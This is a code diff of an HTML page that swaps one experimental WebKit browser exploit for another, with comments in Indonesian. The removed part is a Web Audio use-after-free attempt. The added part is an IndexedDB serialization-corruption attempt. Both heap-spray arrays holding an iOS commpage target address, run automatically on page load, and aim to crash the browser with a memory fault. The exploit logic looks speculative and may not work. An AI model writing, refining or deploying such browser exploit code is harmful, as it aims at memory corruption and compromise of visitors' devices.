@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Web Audio UAF & Buffer Confusion Attack V2 (FIXED)</title>
+    <title>IndexedDB Serialization Corruption Attack</title>
 </head>
 <body>
 
-    <h1>Web Audio UAF & Buffer Confusion (Commpage Target) - V2</h1>
+    <h1>IndexedDB Serialization Attack (Commpage Target)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Siap Memuat Audio Context...</p>
+    <p id="status">INIT: Mempersiapkan Database...</p>
     <div id="log"></div>
 
     <script>
@@ -17,12 +17,9 @@
         const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
         
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); 
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
-        let audioCtx = null;
-        let victimBuffer = null; 
-        let sourceNode = null; // Dibuat global agar bisa diakses
-
+        let db = null;
         let payloadHolders = []; 
 
         function log(message) {
@@ -36,96 +33,103 @@
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 9876.54 + i; // Nilai unik per array untuk identifikasi
-                
+                payloadArray[2] = 1337.0 + i; 
                 payloadHolders.push(payloadArray); 
             }
             log(`Phase Spray: ${SPRAY_COUNT} Payload dimasukkan.`);
         }
 
-        // --- FUNGSI EKSEKUSI UTAMA ---
-        async function runAudioAttack() {
+        // --- OBJEK KORBAN UNTUK SERIALIZATION ---
+        // Objek ini dirancang untuk memiliki 'state' internal yang kompleks
+        function createComplexVictim() {
+            // Membuat objek dengan 'getter' yang memicu side-effect (potensi race condition)
+            let complexObj = {
+                id: 1,
+                // Properti yang akan dibaca selama serialization
+                get dangerousProp() {
+                    // Memicu Heap Spray saat WebKit mencoba menserialisasi objek
+                    sprayPayload();
+                    // Mengembalikan objek ArrayBuffer yang akan diserialisasi
+                    return new ArrayBuffer(512); 
+                },
+                // Getter/Setter untuk menambah kompleksitas
+                set value(v) {
+                    this._v = v;
+                }
+            };
+
+            // Tambahkan objek yang sulit diserialisasi (seperti AudioBuffer yang sedang aktif)
             try {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                log("Phase 1: Audio Context berhasil dibuat.");
-
-                // 2. Alokasi Korban (AudioBuffer)
-                victimBuffer = audioCtx.createBuffer(1, 4096, audioCtx.sampleRate);
-                sourceNode = audioCtx.createBufferSource();
-                sourceNode.buffer = victimBuffer;
-                
-                // KONEKSI ke destination sangat PENTING agar node aktif di C++ thread
-                sourceNode.connect(audioCtx.destination); 
-                log("Phase 2: AudioBuffer Korban dialokasikan dan dikoneksikan.");
-                
-                // 2.5 MEMULAI NODE AUDIO (PERBAIKAN LOGIKA)
-                // Memulai node audio adalah kunci untuk mengaktifkan logika C++ di WebKit
-                sourceNode.start(0); // Mulai pemrosesan audio segera
-                log("Phase 2.5: Pemrosesan Audio Dimulai (Kritis untuk Race Condition).");
-
-
-                // 3. Menciptakan UAF (FREE)
-                // Jadwalkan penghapusan dan disconnect setelah 50ms agar C++ thread punya waktu untuk start
-                setTimeout(() => {
-                    log("Phase 3: Memicu FREE Korban (Disconnection & Penghapusan Referensi)...");
-                    
-                    // Stop dan disconnect memicu cleanup di C++ thread (potensi UAF)
-                    try {
-                        sourceNode.stop(); 
-                    } catch (e) { 
-                        // Abaikan jika stop gagal karena timing audio
-                    }
-                    sourceNode.disconnect();
-                    
-                    // Hapus semua referensi agar GC bisa membersihkan
-                    victimBuffer = null; 
-                    sourceNode = null;
-                    
-                    // Panggil Heap Spray segera setelah FREE
-                    sprayPayload(); 
-
-                    // 4. Memicu Trigger Eksploitasi
-                    setTimeout(() => {
-                        log("Phase 4: Mencoba Trigger UAF Dereference...");
-
-                        // Coba alokasikan AudioBuffer baru, berharap ia menempati lokasi lama
-                        let attackerBuffer = audioCtx.createBuffer(1, 4096, audioCtx.sampleRate);
-                        let attackerView = attackerBuffer.getChannelData(0);
-                        
-                        try {
-                            // Akses data 32-bit di index 1, yang seharusnya berisi LOW_WORD (0xFFFFC320)
-                            // Catatan: Float32Array menampung float (32-bit)
-                            const crashValue = attackerView[1]; 
-                            
-                            log(`Nilai yang dibaca dari buffer yang ditimpa: 0x${crashValue.toString(16)}`);
-                            
-                            // Trigger final crash: gunakan nilai yang dibaca sebagai pointer C++
-                            let crashNode = audioCtx.createOscillator();
-                            // Menggunakan Commpage Address sebagai frekuensi yang tidak valid
-                            crashNode.frequency.value = crashValue; 
-
-                        } catch(e) {
-                            log("JS Error: " + e.message + " - Menunggu Segfault OS.");
-                        }
-
-                    }, 100); // Trigger 100ms setelah free
-                    
-                }, 50); // Free 50ms setelah start
-                
-            } catch (e) {
-                log("ERROR FATAL: " + e.message);
-                document.getElementById('status').textContent = 'EKSPERIMEN GAGAL TOTAL: ' + e.message;
+                 let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                 complexObj.audioData = audioCtx.createBuffer(1, 1024, audioCtx.sampleRate);
+            } catch(e) {
+                 complexObj.audioData = new ArrayBuffer(256);
             }
+            
+            return complexObj;
+        }
+
+        // --- FUNGSI UTAMA ATTACK ---
+        function runIDBAttack() {
+            if (!window.indexedDB) {
+                log("ERROR: IndexedDB tidak didukung.");
+                return;
+            }
+            
+            log("Phase 1: Membuka IndexedDB...");
+            const request = indexedDB.open("ExploitDB", 1);
+
+            request.onupgradeneeded = function(event) {
+                db = event.target.result;
+                // Buat Object Store untuk menyimpan data
+                db.createObjectStore("exploitStore", { keyPath: "id" });
+                log("DB Store dibuat.");
+            };
+
+            request.onsuccess = function(event) {
+                db = event.target.result;
+                
+                const victim = createComplexVictim();
+                const transaction = db.transaction(["exploitStore"], "readwrite");
+                const store = transaction.objectStore("exploitStore");
+
+                log("Phase 2: Memicu Serialization dengan Objek Korban...");
+                
+                // 3. Titik Eksploitasi: PUT data yang kompleks
+                // Getter 'dangerousProp' akan memicu Heap Spray tepat di tengah-tengah serialization
+                const putRequest = store.put(victim); 
+
+                putRequest.onsuccess = function() {
+                    log("Serialization Selesai (Mungkin Corrupt).");
+                };
+
+                putRequest.onerror = function() {
+                    // Jika putRequest gagal, itu adalah indikasi yang sangat baik bahwa serialization buffer corrupt!
+                    log("ERROR: PUT GAGAL. Ini MUNGKIN CRASH YANG KITA CARI!");
+                    // Kita coba trigger dereference (walaupun mungkin tidak perlu jika crash sudah terjadi)
+                    try {
+                        // Coba hapus database untuk memicu cleanup di thread lain
+                        indexedDB.deleteDatabase("ExploitDB");
+                    } catch(e) {}
+                };
+                
+                // Memicu trigger terakhir saat transaksi selesai
+                transaction.oncomplete = function() {
+                    log("Phase 3: Transaksi selesai. Menunggu Segfault.");
+                };
+            };
+
+            request.onerror = function(event) {
+                log("DB Error: " + event.target.errorCode);
+            };
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian Web Audio UAF...';
-            // Start audio context membutuhkan user gesture di iOS, tapi kita panggil langsung
-            runAudioAttack(); 
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Segfault (EXC_BAD_ACCESS).';
+            document.getElementById('status').textContent = 'Memulai rangkaian IndexedDB Attack...';
+            setTimeout(runIDBAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Serialization Corruption.';
         });
 
     </script>
